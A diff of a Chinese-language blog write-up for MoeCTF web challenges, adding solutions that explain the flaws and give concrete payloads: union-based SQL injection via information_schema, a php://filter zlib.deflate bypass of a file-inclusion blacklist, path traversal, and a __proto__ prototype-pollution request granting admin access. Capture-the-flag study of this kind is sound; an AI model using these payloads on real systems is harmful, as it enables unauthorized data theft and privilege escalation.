@@ -14,7 +14,7 @@
 <meta property="og:description" content="moectf复盘查分系统 按 F12 打开开发者工具 使用 Ctrl + U 打开源码 在源码中使用 Ctrl + F 直接搜索 moectf，直接找到了 flag   💡 Web 知识点：F12 是渗透测试的第一步，主要看 Elements（元素）、Console（控制台）和 Network（网络）。Ctrl+U 查看页面源代码往往能发现被隐藏的注释或接口。Ctrl+F 搜索敏感关键字（如 f">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-10-11T11:30:00.000Z">
-<meta property="article:modified_time" content="2026-10-14T05:15:51.118Z">
+<meta property="article:modified_time" content="2026-10-14T11:23:51.226Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Web安全">
@@ -163,14 +163,11 @@
 <blockquote>
 <p>💡 <strong>Web 知识点</strong>：<strong>目录遍历（Path Traversal）</strong>。当服务器对用户输入的路径参数没有严格过滤时，可以通过 <code>../</code>（相对路径）跳出当前目录，访问服务器上的任意文件。例如将 <code>?book=book1.txt</code> 改为 <code>?book=../../../../flag</code> 来读取根目录下的敏感文件。</p>
 </blockquote>
-<h2 id="河湖小盗"><a href="#河湖小盗" class="headerlink" title="河湖小盗"></a><strong>河湖小盗</strong></h2><ul>
-<li>1 and 1&#x3D;1</li>
-<li>1 and 1&#x3D;2</li>
+<h2 id="河湖小盗"><a href="#河湖小盗" class="headerlink" title="河湖小盗"></a><strong>河湖小盗</strong></h2><p>  1 and 1&#x3D;1  1 and 1&#x3D;2</p>
+<ul>
 <li>测试发现考察SQL注入</li>
-<li>测试列数</li>
-<li>1 order by 3</li>
-<li>找回显点</li>
-<li>1 union select 1,2,3</li>
+<li>测试列数<br>1 order by 3</li>
+<li>找回显点<br>1 union select 1,2,3</li>
 <li>开始爆破表名 字段名</li>
 <li>爆破表名<br>id&#x3D;-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<br>-&gt; 拿到 flag_table, past_paper, public_subjects</li>
 <li>爆字段名<br>id&#x3D;-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’flag_table’ </li>
@@ -180,6 +177,123 @@
 </blockquote>
 </li>
 </ul>
+<h2 id="七狗免费小说"><a href="#七狗免费小说" class="headerlink" title="七狗免费小说"></a><strong>七狗免费小说</strong></h2><ul>
+<li>找到了PHP的源码之后发现黑名单</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/http|https|env|\.\.|^\/|=\/|index|proc|input|data|convert|string|file/i&#x27;, $file)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>排除所有被 ban 的经典伪协议</li>
+<li><ol>
+<li><code>file://</code> → 含<code>file</code>，ban</li>
+</ol>
+</li>
+</ul>
+<ol start="2">
+<li><code>data://</code> → 含<code>data</code>，ban</li>
+<li><code>php://input</code> → 含<code>input</code>，ban</li>
+<li><code>php://env</code> → 含<code>env</code>，ban</li>
+<li><code>../</code>目录穿越 → 含<code>..</code>，ban</li>
+<li><code>convert.base64-encode</code>过滤器 → 里面有<code>convert</code>关键词，ban</li>
+<li><code>string.rot13</code>过滤器 → 里面有<code>string</code>关键词，ban</li>
+</ol>
+<p>✅ 剩下唯一可用大类：<strong>php:&#x2F;&#x2F;filter</strong><br><code>php://filter</code> 这个字符串里，<strong>没有任何黑名单关键词！</strong> 不会触发<code>die(&quot;咬你哦！&quot;)</code></p>
+<ul>
+<li>看业务逻辑，理解包含之后发生了什么</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">include($file);</span><br><span class="line">$output = ob_get_clean();</span><br><span class="line"></span><br><span class="line">if (@preg_match(&#x27;//u&#x27;, $output)) &#123;</span><br><span class="line">    echo $output;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo base64_encode($output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>拆解规则：</li>
+</ul>
+<ol>
+<li><code>include($file)</code>：文件包含，<strong>如果是普通 php 文件，会执行代码</strong>；如果是 php:&#x2F;&#x2F;filter 伪协议，只会读取文件原始字节，不执行代码（这正是我们想要的！）</li>
+<li><code>preg_match(&#39;//u&#39;, $output)</code>：检测输出是不是合法 UTF-8 文本<ul>
+<li>UTF8 文本：直接明文输出</li>
+<li>二进制数据：走 else 分支，自动 base64 输出</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>注释提示：<code>小刻不知道什么是二进制流，但是小刻觉得这里的代码古怪</code><br>提示就是告诉：<strong>要制造二进制输出，让程序帮我们 base64 打包返回</strong></p>
+</blockquote>
+<ul>
+<li>选 <code>zlib.deflate</code></li>
+</ul>
+<p>php:&#x2F;&#x2F;filter 可以加载多种过滤器：</p>
+<ul>
+<li>convert.*：被 ban</li>
+<li>string.*：被 ban<br>剩下的：<code>zlib.deflate</code>，zlib 压缩过滤器</li>
+</ul>
+<ol>
+<li><code>zlib.deflate</code> 读取文件源码 → 压缩成<strong>二进制字节流</strong></li>
+<li>二进制不是合法 UTF8 → 命中 else 分支，服务器自动<code>base64_encode</code>返回给浏览器</li>
+<li><code>zlib</code>这个词，<strong>不在黑名单里面</strong>，不会触发咬你哦！</li>
+</ol>
+<blockquote>
+<p>在剩下可用的过滤器里挑符合条件的。</p>
+</blockquote>
+<ul>
+<li>构造 payload</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=zlib.deflate/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>逻辑闭环：<br><code>php://filter</code>（过黑名单） + <code>zlib.deflate</code>（产生二进制，触发 base64 分支） + <code>resource=flag.php</code>（目标文件）</p>
+</li>
+<li><p>最后解码解压得到的一串base64编码数据</p>
+<blockquote>
+<p>注意使用<code>raw inflate</code> 而不是<code>zlib inflate</code>解压</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>💡 <strong>Web 知识点</strong>：<br> 所有同类型都按这个顺序分析：</p>
+</blockquote>
+<ol>
+<li><strong>拿到源码</strong>（一般通过<code>highlight_file(__FILE__)</code>、报错、源码泄露）</li>
+<li><strong>提取黑名单 &#x2F; 白名单正则</strong>，把被禁用的关键词全部划掉，排除所有被 ban 的伪协议</li>
+<li>看<code>include</code>&#x2F;<code>require</code>的前后代码：有没有缓冲区 ob、有没有输出过滤、有没有编码判断（像本题的<code>//u</code>）</li>
+<li>在剩下没被 ban 的伪协议里，选符合代码逻辑的 payload</li>
+<li>测试 payload，拿到回显，解码</li>
+</ol>
+<blockquote>
+<p>  payload 不是固定不变的</p>
+</blockquote>
+<ul>
+<li>有的题黑名单不一样，可能 zlib 被 ban，就要换别的过滤器（iconv 等）</li>
+<li>有的题没有<code>ob_start</code>，没有 UTF8 判断，直接用<code>convert.base64-encode</code></li>
+<li>有的题允许<code>../</code>，直接目录穿越读文件，根本不需要伪协议</li>
+</ul>
+<h2 id="合乎周礼"><a href="#合乎周礼" class="headerlink" title="合乎周礼"></a><strong>合乎周礼</strong></h2><ul>
+<li>注意到 <code>inheritedProbe.isAdmin</code> 和 <code>canReadFlag</code> 都是 <code>null</code>，而 <code>/api/flag</code> 的审核条件是：</li>
+</ul>
+<blockquote>
+<p>只有审核 </p>
+<p><code>isAdmin = true</code></p>
+<p> 且 </p>
+<p><code>canReadFlag = true</code></p>
+<p> 时才返回 FLAG。</p>
+</blockquote>
+<p>于是思路就明确了：想办法让这两个字段变成 <code>true</code>。</p>
+<ul>
+<li>完整攻击链路</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">提交恶意载荷                        递归合并（漏洞点）</span><br><span class="line">POST /api/profile   ──────────►   &#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: true, &quot;canReadFlag&quot;: true&#125;&#125;</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">原型污染生效：覆盖 Object.prototype</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">inheritedProbe.isAdmin / canReadFlag 原本为 null，</span><br><span class="line">自身没有 → 沿原型链回退读到被污染注入的 true</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">审核通过（isAdmin=true &amp;&amp; canReadFlag=true）</span><br><span class="line">        │</span><br><span class="line">        ▼</span><br><span class="line">GET /api/flag  →  返回 FLAG</span><br></pre></td></tr></table></figure>
+
+<p><strong>总结漏洞</strong>：递归合并未过滤 <code>__proto__</code> → 原型污染；利用方式为污染 <code>Object.prototype</code> 注入 <code>isAdmin/canReadFlag</code> → <code>null</code> 属性沿原型链回退读到 <code>true</code> → 审核放行。</p>
+<blockquote>
+<p>💡 <strong>Web 知识点</strong>：什么是原型污染（Prototype Pollution）</p>
+</blockquote>
+<p>在 JavaScript 中，每个对象都有一个<strong>原型（prototype）</strong>，它是属性查找的 “后备”。当访问某个属性时：</p>
+<ol>
+<li><p>先看对象<strong>自身</strong>有没有这个属性；</p>
+</li>
+<li><p>没有就沿 ** 原型链（prototype chain）** 逐层往上找；</p>
+</li>
+<li><p>找到了就返回，找不到才返回 <code>undefined</code>。</p>
+</li>
+</ol>
+<p>如果一段代码在<strong>合并 &#x2F; 拷贝 &#x2F; 赋值</strong>数据时，没有过滤 <code>__proto__</code>、<code>constructor</code>、<code>prototype</code> 这类特殊键，攻击者就能往 <code>Object.prototype</code> 里 “注入” 属性。而 <code>Object.prototype</code> 是所有对象的公共祖先 ——<strong>污染一次，全局所有对象都能 “继承” 到这些属性</strong>。</p>
 
       
     </div>
